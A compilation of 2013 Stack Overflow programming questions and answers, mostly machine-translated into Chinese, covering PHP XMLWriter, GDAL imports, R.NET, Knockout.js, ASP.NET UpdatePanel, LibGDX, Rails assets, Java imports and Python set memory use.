> KEY_SPEC_SESSION_KEYRING 这指定调用者的会话特定密钥环。
> 
> KEY_SPEC_USER_KEYRING 这指定调用者的 UID 特定的密钥环。
> 
> KEY_SPEC_USER_SESSION_KEYRING 这指定调用者的 UID 会话密钥环。

我知道我可能需要使用内核中的 register_key_type API 在内核中注册我自己的“类型”。但是我不明白应该将什么值传递给 keyring 参数。另外，所有者在分配权限时是什么意思？

# php - XMLWriter 有时会卡住 PHP

> ID：15555692
> 
> 赞同：1
> 
> 时间：2013-03-21T18:46:28.403
> 
> 标签：php, xml, xmlwriter

我有一个常规的 XMLWriter 结构并且它工​​作正常，我的问题是它有时会卡在循环中间并停止循环，但有时它在循环结束时会正常，这可能是这个结构的问题。

```
$xml = new XMLWriter();
$xml->openMemory();
$xml->startDocument('1.0', 'UTF-8');
$xml->startElement('rows');
$xml->writeElement('TotalRows', count($total));

foreach ($rows as $row) {
    $xml->startElement('row');
    $xml->writeElement('id',  $row['fba_sku']);
    $xml->writeElement('sku', $row['sku']);

    // There is 31 elements with calculations

    if (0 == $i%1000) {
        file_put_contents('example.xml', $xml->flush(true), FILE_APPEND);
    }
}

$xml->endElement();
file_put_contents('example.xml', $xml->flush(true), FILE_APPEND); 
```

# python - GeoDjango Shell中的GDAL python绑定错误

> ID：15555695
> 
> 赞同：0
> 
> 时间：2013-03-21T18:46:39.993
> 
> 标签：python, geodjango, gdal

我想在我的 GeoDjango 站点中使用 GDAL python 绑定。这样做的目的是在脚本中使用 ogr2ogr 功能。我在 Windows 7 上，所以我安装了 GDAL-1.9.2.win32-py2.7 下载[here](http://www.lfd.uci.edu/~gohlke/pythonlibs/#gdal)

安装正确。我可以在python中导入GDAL：`from osgeo import GDAL`

但是，在我的 geodjango 应用程序 python shell 中，当我尝试导入 osgeo 时出现错误。错误如下：

```
>>> import osgeo
Traceback (most recent call last):
  File "<console>", line 1, in <module>
  File "C:\Python27\lib\site-packages\osgeo\__init__.py", line 21, in
_gdal = swig_import_helper()
  File "C:\Python27\lib\site-packages\osgeo\__init__.py", line 17, in
t_helper_mod = imp.load_module('_gdal', fp, pathname, description)
 ImportError: DLL load failed: La procÚdure spÚcifiÚe est introuvable.
>>> 
```

有人可以帮我弄这个吗？

我正在使用 GeoDjango v. 1.4.3 | 蟒蛇2.7.3 | GDAL 1.9.2 win32

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-22T13:02:27.803

仅安装 python 绑定不提供对 GDAL 的访问。几年前发布了一个[简短的博客，可能会有所帮助。](http://php.scripts.psu.edu/jzl5325/wordpress/?p=60)

简而言之，您需要前往[gisinternals](http://www.gisinternals.com/sdk/)并下载 GDAL。然后你应该有一个有效的GDAL安装，从osgeo import gdal可以工作。

# c# - 无法从 C# 连接到 R

> ID：15555698
> 
> 赞同：0
> 
> 时间：2013-03-21T18:46:49.607
> 
> 标签：c#, r

我正在尝试使用以下代码从 c# 连接到 R。看起来 C# 没有读取 R dll 文件。我的 R 安装目录是这样的：

```
C:\Users\R-2-13\R-2.13.0\bin\i386 
```

我还下载了 R.NET.dll 并将其放在同一目录中。在 Visual Studio 中，我设置了对 R.NET.dll 文件的引用。当我运行以下代码时，代码进入“无法找到 R 安装”的 catch 部分。有任何想法吗？有没有人有这个工作？

```
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Windows.Forms;
using RDotNet;

namespace RNet_Calculator
{
    public partial class Form1 : Form
    {

        // set up basics and create RDotNet instance 
        // if anticipated install of R is not found, ask the user to find it. 

        public Form1()
        {
            InitializeComponent();

            bool r_located = false;
            while (r_located == false)
            {
                try
                {
                    REngine.SetDllDirectory(@"C:\Users\R-2-13\R-2.13.0\bin\i386");
                    REngine.CreateInstance("RDotNet"); 
                    r_located = true;
                }

                catch { MessageBox.Show(@"Unable to find R installation's \bin\i386 folder. Press OK to attempt to locate it."); 

                        MessageBox.Show("error");

                } 
            }
        }

        private void Form1_Load(object sender, EventArgs e)
        {

        }
    }
} 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-21T19:17:20.833

这是[http://rdotnet.codeplex.com/](http://rdotnet.codeplex.com/) (RDotNet) 用于开发 Winform 应用程序。虽然我非常了解 Shiny 和所有其他类似 Web 的 R 工具，但 c# 和 R 的组合仍然是我首选的最终用户组合。尝试简单的事情，例如使用 Shiny 禁用按钮...

太糟糕了 rdotnet 有很多错误；在当前版本中，它在 R 异常中崩溃，即使在尝试捕获的异常中也是如此。

这就是说：请绝对确保您使用的是 1.5 版本，而不是页面上愚蠢地称为“稳定”（=早期测试版）的版本。最好通过 NuGet 下载。还要检查您是否没有将 32 位 R 与 64 位 c# 混合使用。

使用 1.5 的辅助函数，初始化是：

```
 Helper.SetEnvironmentVariables();
  engine = REngine.CreateInstance(EngineName);
  engine.Initialize();
  # Assuming you want to catch the graphic window, use my RGraphAppHook
  # on the rdotnet site http://rdotnet.codeplex.com/workitem/7
  cbt = new RGraphAppHook { GraphControl = GraphPanelControl }; 
```

# javascript - 使用 Javascript 确定网站是公共的还是私有的

> ID：15555701
> 
> 赞同：0
> 
> 时间：2013-03-21T18:47:17.907
> 
> 标签：javascript, jquery, url

所以让我们假设我们有两个网站：

1.  一个托管在具有公共域名的公共网络托管帐户上，例如 mydomain.com

2.  另一个托管在本地计算机上，例如我的笔记本电脑，但配置为使用相同的主机名运行，例如 mydomain.com，使用 Apache 虚拟主机

所以两者都会有相同的`window.documentURI`or `window.location.href`。

有没有一种方法可以使用 Javascript 确定哪个网站是公开托管的，哪个是私人托管的？！

谢谢

**编辑**

我需要这个的原因是我正在完成一个 JQuery 插件，它将一些数据提交到远程服务器 [基本上分析]，我想通过防止有人使用与主机名相同的本地服务器进行欺骗来使该功能更加安全合法用户弄乱数据。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-21T18:49:50.100

> 有没有一种方法可以使用 Javascript 确定哪个网站是公开托管的，哪个是私人托管的？！

**不**。你希望它知道什么？javascript 对托管机器的访问控制非常有限。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-21T18:57:24.347

并非没有第三方服务的帮助。

您的 javaScript 可以发送两个 AJAX 查询：1）返回客户端的公共 IP 2）返回域的公共 DNS IP。您将比较这两个结果。

# javascript - Knockout Observable Array Length 始终为 0

> ID：15555704
> 
> 赞同：9
> 
> 时间：2013-03-21T18:47:24.410
> 
> 标签：javascript, html, knockout.js, mapping, ko.observablearray

在 customerOverview 视图模型中调用任何可观察的长度时，我收到的长度为零。当绑定随数据更新时，可观察对象中存在数据，但长度保持为 0。基本视图模型“CustomerCentral”正确返回长度。我需要'CustomerOverview'中一些可观察的长度来做一些条件语句。

## HTML 绑定

```
<ul class="nav nav-list">
      <li class="nav-header">Contacts</li>
      <!--ko  if: customerOverview.contacts().length == 0-->
      <li>No contacts associated with this customer</li>
       <!-- /ko -->
      <!--ko  foreach: customerOverview.contacts()-->
      <li>
      <a data-bind="click: $root.customerOverview.viewContact"><i class="icon-chevron-                        right single pull-right">
       </i><span data-bind="text: FirstName"></span><span data-bind="text: LastName"></span>
      </a></li>
      <!-- /ko -->
</ul> 
```

## JS

```
function CustomerOverview() {
        var self = this;        

        self.contacts = ko.observableArray([]);           

        self.getCustomerContacts = function () {
            requestController = "/CRM/CustomerCentral/CustomerContacts";
            queryString = "?id=" + self.customer().Id();
            $.ajax({
                cache: false,
                type: "GET",
                dataType: "json",
                url: baseURL + requestController + queryString,
                headers: { "AuthToken": cookie },
                success:
                        function (data) {
                            if (data.data.length > 0) {

                                self.contacts(ko.mapping.fromJS(data.data));

                                console.log(self.contacts().length);
                            }
                        }
            });
        };
};
   function CustomerCentral() {

        var self = this;

        self.customerOverview = ko.observable(new customerOverview());
};

var vm = new CustomerCentral();
    ko.applyBindings(vm); 
```

控制台 cmd：vm.customerOverview().contacts().length 0

- - - - - - - - - - - - - -解决方案 - - - - - - - - - - - observableArray.push()

问题原来是这一行：

```
 self.contacts(ko.mapping.fromJS(data.data)); 
```

解决方案：添加 .push() 可以增加数组的长度属性。我曾假设 ko.mapping 会处理这个问题，但事实并非如此。将变量更改为 observable 没有效果。

```
 $.each(data.data, function () {
          self.contacts.push(ko.mapping.fromJS(this));
           console.log(self.contacts().length);
                                    }); 
```

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2013-03-21T18:54:35.337

我认为你的问题是没有你的`customerOverview`财产是可观察的

尝试：

```
 self.customerOverview = ko.observable(new CustomerOverview()); 
```

或者

```
 self.customerOverview = ko.computed(function(){
       return new CustomerOverview();
 }); 
```

**工作样本：**

[http://jsfiddle.net/dvdrom000/RHhmY/1/](http://jsfiddle.net/dvdrom000/RHhmY/1/)

## html

```
<span data-bind="text: customerOverview().contacts().length"></span>
<button data-bind="click: customerOverview().getCustomerContacts">Get contacts</button> 
```

## js

```
function CustomerOverview() {
        var self = this;        

        self.contacts = ko.observableArray([]);           

        self.getCustomerContacts = function () {
            self.contacts.push(1);
            self.contacts.push(2);
            self.contacts.push(3);            
        };
};
   function CustomerCentral() {

        var self = this;
        // Is this a correct way. Am I breaking something with this?
        self.customerOverview = ko.observable(new CustomerOverview());
};

var vm = new CustomerCentral();
    ko.applyBindings(vm); 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2016-05-17T13:34:06.593

> Knockout 为数组提供了一组操作函数，这些函数反映了 JavaScript 中的函数；pop、push、shift、unshift、reverse、sort 和 splice。除了执行您期望的操作外，这些数组函数还将自动通知任何观察者该数组已更改。JavaScript 方法不会。如果您希望您的 UI 在数组计数更改时更新，您需要小心使用 Knockout 函数。

参考：[http ://ryanrahlf.com/knockout-js-observablearray-not-updating-the-ui-heres-how-to-fix-it/](http://ryanrahlf.com/knockout-js-observablearray-not-updating-the-ui-heres-how-to-fix-it/)

所以基本上，要解决你的问题，你只需要直接在可观察数组上使用敲除推送功能，而不是使用 javascript 推送方法。因此：

改变这个：

```
self.contacts( ).push( data.data ); 
```

这样：

```
self.contacts.push( data.data ); 
```

您将能够在您的 html 上使用 contacts( ).length 属性，并在数组中的每次更改时收到通知。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2013-03-21T20:03:38.387

## observableArray.push()

问题原来是这一行：

```
self.contacts(ko.mapping.fromJS(data.data)); 
```

解决方案：添加 .push() 可以增加数组的长度属性。我曾假设 ko.mapping 会处理这个问题，但事实并非如此。将变量更改为 observable 没有效果。

```
$.each(data.data, function () {
          self.contacts.push(ko.mapping.fromJS(this));
           console.log(self.contacts().length);
                                    }); 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-03-21T18:56:40.533

我遇到了这样的问题，IIRC，这是因为我在评论条件中使用双等号（==）而不是三等号（===）。试一试。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2016-12-07T12:07:43.360

代替：

```
self.contacts(ko.mapping.fromJS(data.data)); 
```

你应该有：

```
self.contacts(ko.mapping.fromJS(data.data)**()**); 
```

# c# - 无法通过跨页面发布取消注册 UpdatePanel 异常

> ID：15555707
> 
> 赞同：1
> 
> 时间：2013-03-21T18:47:31.713
> 
> 标签：c#, asp.net, cross-page-posting

在尝试组合弹出窗口和一些跨页发布时，我遇到了可怕的异常“无法取消注册 ID 为‘UpdatePanel’的 UpdatePanel，因为它没有在 ScriptManager 中注册”。我已经能够用一个小例子重现这个问题。

我已经看到处理 UpdatePanel 的 Unload 事件的其他问题，但这似乎不适用于添加跨页面发布。

**我该如何解决这个问题？**

使用以下代码复制问题：

1.  启动设置页面
2.  按查看弹出链接
3.  关闭弹出窗口
4.  按下一步按钮转移到目标页面
5.  按返回按钮转到设置页面
6.  按查看链接并关闭弹出窗口
7.  按下一步按钮，看看失败

以下是亮点（请原谅长度，但它应该是可剪切和粘贴的）：

**安装程序.aspx**

```
<head runat="server">
    <title>Setup </title>
    <script type="text/javascript">
        function openCenteredWindow(url, height, width, name, parms) {
            //Snip setting up window location stuff
            var win = window.open(url, name, winParms);
            return win;
        }
    </script>
</head>
<body>    
    <h1>Setup Page</h1>
    <form id="aspnetForm" runat="server">
    <div>
        <asp:TextBox ID="txtData" runat="server" Width="80%" Text="<%# Information %>" />
        <br />

        <asp:LinkButton ID="lbViewData" runat="server" 
        OnClientClick="aspnetForm.target='ViewDataPopup';" 
        Text="View In Popup" /> <br />

        <asp:Button ID="btnNext" runat="server" Text="Next" OnClick="btnNext_Click" />
    </div>
    <div>
        <br />
        <asp:ScriptManager ID="ScriptManager1" runat="server">
        </asp:ScriptManager>
    <asp:updatepanel ID="UpdatePanel" runat="server" OnUnload="UpdatePanel_Unload"></asp:updatepanel>
    </div>
    </form>
</body> 
```

**安装程序.aspx.cs**

```
public partial class Setup : System.Web.UI.Page
{
    protected override void LoadViewState(object savedState)
    {
        base.LoadViewState(savedState);
        if (this.ViewState["Information"] != null)
            _Information = this.ViewState["Information"].ToString();
    }

    protected override object SaveViewState()
    {
        this.ViewState["Information"] = _Information;
        return base.SaveViewState();
    }

    protected void Page_Load(object sender, EventArgs e)
    {
        if (PreviousPage != null && PreviousPage is TargetPage)
        {
            _Information = ((TargetPage)PreviousPage).SetupData;
        }
        else if (!Page.IsPostBack)
        {
            _Information = String.Format("This test started at {0}", DateTime.Now);
        }
        Page.DataBind();
        lbViewData.PostBackUrl = "ViewData.aspx?u=0";
        lbViewData.Attributes.Add("onclick", "JavaScript:openCenteredWindow(\"ViewData.aspx?u=0\", 400, 300, \"ViewDataPopup\", 'scrollbars=yes');");
    }

    private string _Information;
    public string Information
    {
        get { return _Information; }
    }

    protected void btnNext_Click(object sender, EventArgs e)
    {
        HttpContext.Current.Server.Transfer("~/TargetPage.aspx");
    }
} 
```

**视图数据.aspx**

```
<%@ PreviousPageType VirtualPath="~/Setup.aspx" %> 

<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">

<head runat="server">
    <title>View Data</title>
       <script type="text/javascript">
           function fixForm() {
               opener.document.getElementById("aspnetForm").target = "";
               opener.document.getElementById("aspnetForm").action = "";               
           }
    </script>
</head>
<body onload="fixForm()">
    <form id="aspnetForm" runat="server">
    <div>
        <h2 >View Data</h2>
    </div>
    <asp:Label ID="lblData" runat="server" Text="<%# SetupData %>" />
    </form>
</body> 
```

**ViewData.aspx.cs**

```
protected void Page_Load(object sender, EventArgs e)
{
    if (PreviousPage != null)
    {
        Setup setup = (Setup)PreviousPage;
        this.SetupData = setup.Information ?? "Data not set in Setup Page";
    }
    Page.DataBind();
}

private string _setupData = "Did not get updated data";
protected string SetupData
{
    get { return _setupData; }
    set { _setupData = value; }
} 
```

**目标页面.aspx**

```
<%@ PreviousPageType VirtualPath="~/Setup.aspx" %>
<body style="background-color: #9999BB">
    <h1>Target Page</h1>
    <form id="aspnetForm" runat="server">
    <div>
        <asp:Label ID="lblData" runat="server" Text="<%# SetupData %>" /><br />
        <asp:Button ID="btnBack" runat="server" Text="Back" OnClick="btnBack_Click" />
    </div>
    </form>
</body> 
```

**TargetPage.aspx.cs**

```
protected void Page_Load(object sender, EventArgs e)
    {
        if (!IsPostBack)
        {
            if (this.PreviousPage == null)
                Response.Redirect("Setup.aspx");

            this.SetupData = PreviousPage.Information;
        }
        Page.DataBind();
    }

    public string SetupData
    {
        get { return ViewState["SetupData"].ToString(); }
        set { ViewState["SetupData"] = value; }
    }

    protected void btnBack_Click(object sender, EventArgs e)
    {
        HttpContext.Current.Server.Transfer("~/Setup.aspx");
    } 
```

正如您所看到的，让 UpdatePanel 仅仅停留在页面上并且什么都不做就足以让这个错误发生。

# image-processing - 检索“视觉相似”图像的概念查询：密集 SIFT 或其他描述符？

> ID：15555709
> 
> 赞同：0
> 
> 时间：2013-03-21T18:47:41.010
> 
> 标签：image-processing, computer-vision, sift, feature-selection

我发布了我的数据集的 3 张图像，以显示我的图像在视觉上的外观：

[http://s1306.photobucket.com/user/Bidisha_Chakraborty/library/?page=1](http://s1306.photobucket.com/user/Bidisha_Chakraborty/library/?page=1)

我正在使用 VLFFeat DSIFT 实现。我使用每个描述符 4 个方向而不是 8 个。所以在我的情况下，它是 64 维向量而不是 128。我使用图像的原始比例，因为我的图像数据最初是从固定距离获取的。我以 4/8 像素的间隔密集计算描述符。我通过将窗口大小从 80*80 像素更改为 20*20 像素进行了几次实验。我对不同数量的聚类中心进行了聚类方法。最后，我使用了推土机的距离来计算相似度指标。在对窗口大小、字数进行各种参数调整后，我发现即使我有像 1 和 3 这样几乎相似的图像，距离度量也表明图像 1 与图像 2 比图像 1 与图像 3 更相似。

我做了主成分分析来查看数据的方差。我希望图像 1 和图像 2 具有分离的簇，而图像 1 和 3 具有重叠的簇。由于我绘制了前 3 个维度，而这 3 个维度占数据的比例不到 30%，我确信包括所有维度（我当然无法可视化）会产生更差的结果。

1.  我是否应该得出结论认为 SIFT 不是我的应用程序的最佳选择，或者我错过了一些东西。我已经为这些使用了 GLCM，但没有得到好的结果。非常欢迎对任何其他功能空间提出任何建议。感谢您的任何见解。

# java - LibGDX 表格布局菜单不显示

> ID：15555713
> 
> 赞同：1
> 
> 时间：2013-03-21T18:47:58.117
> 
> 标签：java, user-interface, opengl-es, libgdx, android-tablelayout

我正在 LibGDX 中编写一个处理 Backgroundtextures 的新程序，并且刚刚开始实现屏幕。但是当我测试它时，它只显示给我一个具有给定分辨率的黑色清除屏幕。我在已实现的 Game 类中使用 setScreen(screen)- 方法调用屏幕。

所以这里是代码：

```
public class MenuScreen implements Screen{
Table table;
Stage stage;
TextButton button;
TextField textField;
Texture texture;
Pic2Box2d game;

public MenuScreen(Pic2Box2d gameH)
{
    this.game = gameH;
    stage = new Stage(0, 0, true);
    table = new Table();
}
public void create()
{
    final TextFieldStyle fieldStyle = new TextFieldStyle(new BitmapFont(), Color.WHITE, new BitmapFont(), Color.GRAY, null, null, null);
    textField = new TextField("path", fieldStyle);
    final TextButtonStyle buttonStyle = new TextButtonStyle();
    buttonStyle.font = new BitmapFont();
    buttonStyle.fontColor = Color.WHITE;
    buttonStyle.pressedOffsetY = 1f;
    buttonStyle.downFontColor = new Color(0.8f, 0.8f, 0.8f, 1f);
    button = new TextButton("Übernehmen", buttonStyle); 
    button.setClickListener(new ClickListener() {
        @Override
        public void click(Actor actor, float x, float y) {
            if(textField.getText() != "" && textField.getText() != "path")
            {
            texture = new Texture(textField.getText());
            game.setScreen(new Workscreen(texture));
            }
        }
    });
    table.row();
    table.add(textField);
    table.add(button);
    stage.addActor(table);
}
@Override
public void render(float delta) {
    Gdx.gl.glClear(GL10.GL_COLOR_BUFFER_BIT);
    Gdx.gl.glClearColor(0, 0, 0, 1);
    stage.act(Gdx.graphics.getDeltaTime());
    stage.draw();
} 
```

}

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-21T23:56:04.043

@idaNakav 关于使用*show()*和设置*舞台*尺寸是正确的。但是，这仍然会给您一个黑屏，因为您的表格没有任何大小。尝试更改您的*show()*代码以包含*table.setFillParent(true)*。

它应该看起来像这样（基于您提供的示例的代码）。

```
@Override
public void show() {
    final TextFieldStyle fieldStyle = new TextFieldStyle(new BitmapFont(), Color.WHITE, null, null, null);
    textField = new TextField("path", fieldStyle);
    final TextButtonStyle buttonStyle = new TextButtonStyle();
    buttonStyle.font = new BitmapFont();
    buttonStyle.fontColor = Color.WHITE;
    buttonStyle.pressedOffsetY = 1f;
    buttonStyle.downFontColor = new Color(0.8f, 0.8f, 0.8f, 1f);
    button = new TextButton("Übernehmen", buttonStyle);
    button.addListener(new ClickListener() {
        @Override
        public void clicked(InputEvent event, float x, float y) {
            if (textField.getText() != "" && textField.getText() != "path") {
                texture = new Texture(textField.getText());
                game.setScreen(new Workscreen(texture));
            }
        }
    });

    table.row();
    table.add(textField);
    table.add(button);

    // Make the table fill the stage.
    table.setFillParent(true);

    stage.addActor(table);
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-21T20:13:03.903

当 screen 成为调用当前屏幕[显示](http://libgdx.l33tlabs.org/docs/api/com/badlogic/gdx/Screen.html#show%28%29)方法时（不是像您的情况那样创建），请尝试将您的创建方法更改为显示

你也是初始化阶段错误，你应该发送它的宽度和高度，你发送了 0,0 试试类似的东西

```
stage = new Stage(Gdx.graphics.getWidth(),Gdx.graphics.getHeight(),false); 
```

# css - 为什么 rake assets:precompile 会生成一个空的 CSS 样式表？

> ID：15555714
> 
> 赞同：1
> 
> 时间：2013-03-21T18:48:00.083
> 
> 标签：css, ruby-on-rails-3.2, sass, haml, asset-pipeline

我正在使用**sass-rails**和**haml-rails** gems，这样我就可以用 HAML-sass 样式编写 css 文件。

问题是当我想进行生产并预编译我的样式表时，命令`rake assets:precompile`运行没有错误，但生成的 application.css 是空的。

这是我的 Gemfile ：

```
source 'https://rubygems.org'

gem 'rails', '~>3.2'
gem 'pg', '>= 0.14'
gem 'haml-rails' #, '~> 0.3'

group :development, :test do
  gem 'factory_girl_rails'
end

group :developpement do
  gem 'rspec-rails', '>= 2.11'
  gem 'capistrano', '>= 2.12'
  gem 'faker', '>= 1.0'
  gem 'rvm-capistrano'
end

group :test do
  gem 'rspec', '>= 2.11'
  gem 'webrat', '>= 0.7'
  gem 'spork-rails', '>= 3.2'
end

group :assets do
  gem 'sass-rails',   '>= 3.2.3'
  gem 'coffee-rails', '>= 3.2.1'
  gem 'compass-rails', '>= 1.0'
  gem 'execjs'
  gem 'therubyracer', :platforms => :ruby

  gem 'uglifier', '>= 1.0.3'
end

gem 'jquery-rails'
gem 'annotate'
gem 'excel_rails' #, '~> 0.3'
gem 'spreadsheet' #, '~> 0.7'
gem "schema_plus", :git => "git://github.com/lomba/schema_plus.git"
gem 'ar-octopus' #, '~> 0.3'
gem 'squeel' #, '~> 1.0'
gem 'devise' #, '~> 2.1'
gem 'role_model'
gem 'declarative_authorization'
gem 'rails-translate-routes'  #, '~> 0.1'
gem 'validates_timeliness'  #, '~> 3.0' 
```

这是我的（空）app/assets/stylesheets/application.css.sass

```
/*
 * This is a manifest file that'll be compiled into application.css, which will include all the files
 * listed below.
 *
 * Any CSS and SCSS file within this directory, lib/assets/stylesheets, vendor/assets/stylesheets,
 * or vendor/assets/stylesheets of plugins, if any, can be referenced here using a relative path.
 *
 * You're free to add application-wide styles to this file and they'll appear at the top of the
 * compiled file, but it's generally better to create a new file per style scope.
 *
 */ 
```

我根据[https://github.com/rails/sass-rails](https://github.com/rails/sass-rails)上的建议删除了以下注释行：

```
 *= require_self
 *= require_tree . 
```

我的 css.sass 文件存储在这里：

*   应用程序/资产/样式表/screen.css.sass
*   app/assets/stylesheets/partials/（screen.css.sass 引用的许多部分文件 _*.css.sass）

=== 更新 ===

请注意我正在使用 COMPASS gem。所以 mixin 和变量需要在样式表之间共享。

以防万一，这是我的 app/assets/stylsheets/screen.css.sass 文件：

```
// This import applies a global reset to any page that imports this stylesheet.
@import blueprint/reset

// To configure blueprint, edit the partials/base.sass file.
@import partials/base

@import blueprint/interaction
@import blueprint/typography
@import blueprint/grid
@import blueprint/buttons
@import blueprint/utilities

@import compass/layout/grid-background
@import compass/typography/lists/inline-block-list
@import compass/typography/lists/horizontal-list
@import compass/utilities/general/float
@import compass/css3/border-radius
@import compass/css3/box-shadow
@import compass/css3/text-shadow
@import compass/css3/transition

@import partials/opf_mixins_et_functions
@import partials/link_icons
@import partials/typo
@import partials/application
@import partials/affichage_donnees
@import partials/tableau_edition
@import partials/page
@import partials/form
@import partials/feedback 
```

=== 更新 2 ===

我意识到我的 Gemfile 会导致我在生产中遇到麻烦，因为我将以下 Gems 放在**assets 组**中：

```
group :assets do
  ...
  gem 'execjs'
  gem 'therubyracer', :platforms => :ruby
  ...
end 
```

因为**生产**环境也需要一个 javascript 解释器......所以我会将它们移到我的 Gemfile 中的任何组之外。

欢迎任何建议

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-21T21:33:10.157

建议您删除这两行，但您仍然需要包含自己的文件：

```
*= require screen
*= require_dir partials/ 
```

但是，请注意一些事情：这不会像`@import`- 你不会让你的 mixins 和变量共享。为此使用真实`@import`的

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-22T11:47:29.147

好的，我用以下解决方案解决了它：

按照最后一个答案的精神，似乎在我的 /app/assets/styelsheets/application.css.sass 末尾添加以下行解决了我的问题：

```
@import screen 
```

然后将自动导入 screen.css.sass引用的每个*部分样式表。*

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-09-14T17:15:25.807

我的预编译资产（application.js 和 application.css）是空的......

什么为我解决了这个问题：

*   在 Gemfile 中设置最后一个 rails 版本（目前为 3.2.14）

*   `bundle update`

*   `bundle install`

*   重启应用`touch tmp/restart.txt`

# java - URL connection test - compilation error

> ID：15555717
> 
> 赞同：-1
> 
> 时间：2013-03-21T18:48:05.830
> 
> 标签：java

I am new to Java, have searched on the net and this forum but unable to figure out why my code is not compiling? Any help will be highly appreciated.

```
//filename is TestHTTPConnection.java

class TestHTTPConnection {

public static void main (String[] args){

    String strUrl = "http://abc.com";

    try {
        URL url = new URL(strUrl);
        URLConnection Conn = url.openConnection();
        Conn.connect();

        assertEquals(URLConnection.HTTP_OK, Conn.getResponseCode());
    } catch (IOException e) {
        System.err.println("Error creating HTTP connection");
        e.printStackTrace();
        throw e;
    }
}
} 
```

Compilation error - complains about "URL", "URLConnection" and "IOException".

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-03-21T18:50:55.833

您需要导入这些类/接口！

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-03-21T18:52:46.473

你错过了两件事：

包装线：

```
package yourdomain.yourapp; 
```

和进口清单：

```
import java.io.IOException;
import java.net.URL;
import java.net.URLConnection; 
```

大多数 Java 开发人员使用自动化所有这些的 IDE（例如 NetBeans、IntelliJ IDEA 或 Eclipse）

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-21T18:57:21.747

如果您不使用 IDE（Eclipse、NetBeans 等），请下载一个它会为您提供内容帮助并指出此类错误。

# android - Division not giving the expected result

> ID：15555724
> 
> 赞同：0
> 
> 时间：2013-03-21T18:48:16.393
> 
> 标签：android, floating-point, division, integer-division

Code:

```
float cordsStepAmountHeight;
float cordsStepAmountWidth;

coordStepAmountHeight=(2.0f/height);
coordStepAmountWidth=(2.0f/width); 
```

Where width is 2560 and height is 1504 (the resolution of my device).

After the calculation, the value of coordStepAmountHeight is 0.0013297872 which is correct but cordsStepAmountWidth is coming out as 7.8125E-4 (When I believe is it should be 0.00078125)

Why is coordStepAmountWidth coming out like this? Is it something to do with the variable being declared as a float and not being able to cope with the calculation or something else?

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-21T18:51:37.760

是同一个号码。就是所谓的浮点数的科学表示。你可以在这里阅读更多关于它的信息：http: [//www.learncpp.com/cpp-tutorial/25-floating-point-numbers/](http://www.learncpp.com/cpp-tutorial/25-floating-point-numbers/)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-21T18:50:30.213

7.8125E-4 和 0.00078125 与*e-4*相同，表示 x10^-4（除以 10000）。因此，它们在数学角度上是相同的。

# jquery - JQuery integer value won't change?

> ID：15555727
> 
> 赞同：0
> 
> 时间：2013-03-21T18:48:19.770
> 
> 标签：jquery, integer

I have a function:

```
function my_function_name()
    {
        var $obj = $my_object;
        var idx = Number($obj.order);
        var newIndex = idx+1;
    } 
```

"newIndex" is NOT "idx + 1" but simply the same value as "idx". "$obj.order" is holding an integer value.

Any ideas what is going on?

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-21T20:09:33.403

# [演示小提琴](http://jsfiddle.net/mohammadAdil/9JJ5D/)

```
function num(i) {
    this.order = i;
}

$my_object = new num(10);

var $obj = $my_object;
var idx = Number($obj.order);
var newIndex = idx + 1; 
```

根据你的问题`newIndex`应该有`10`，但我正在`11`输出（见小提琴）

# python - Python 非常大的集合。如何避免内存不足异常？

> ID：15555728
> 
> 赞同：8
> 
> 时间：2013-03-21T18:48:19.980
> 
> 标签：python, python-2.7

我使用 Python 集合来存储唯一的对象。每个对象都有`__hash__`并被`__eq__`覆盖。

该集合包含近 200 000 个对象。该集本身需要近 4 GB 的内存。它在超过 5 GB 的机器上运行良好，但现在我需要在只有 3 GB 可用 RAM 的机器上运行脚本。

我用 C# 重写了一个脚本——实际上是从同一个源读取相同的数据，把它放到一个集合（HashSet）的 CLR 模拟中，而不是 4 GB，它花了将近 350 MB，而脚本执行的速度相对相同（接近 40 秒）但我必须使用 Python。

Q1：Python 是否有任何“磁盘持久化”设置或任何其他解决方法？我猜它只能将哈希/eq方法中使用的“关键”数据存储在内存中，其他所有内容都可以保存到磁盘。或者，Python 中可能有其他解决方法来拥有一个独特的对象集合，这些对象可能占用比系统中可用的内存更多的内存。

Q2：不太实际的问题：为什么python set 需要这么多的内存？

我在 64 位 Ubuntu 12.10 上使用标准 Python 2.7.3

谢谢你。

更新1：什么脚本：

1.  阅读大量半结构化 JSON 文档（每个 JSON 由序列化对象和与其相关的聚合对象集合组成）

2.  解析每个 JSON 文档以从中检索主对象和聚合集合中的对象。每个解析的对象都存储到一个集合中。Set 仅用于存储唯一的对象。首先我使用了一个数据库，但数据库中的唯一约束工作 x100-x1000 慢。每个 JSON 文档都被解析为 1-8 种不同的对象类型。每个对象类型都存储在它自己的集合中，以便在内存中只保存唯一的对象。

3.  存储在集合中的所有数据都保存到具有唯一约束的关系数据库中。每个集合都存储在单独的数据库表中。

该脚本的整个想法是获取非结构化数据，从 JSON 文档中的聚合对象集合中删除重复项，并将结构化数据存储到关系数据库中。

更新 2：

2 delnan：我注释了所有代码行，并添加到不同的集合中，以保持所有其他人员（获取数据、解析、迭代）相同 - 脚本占用的内存少了 4 GB。

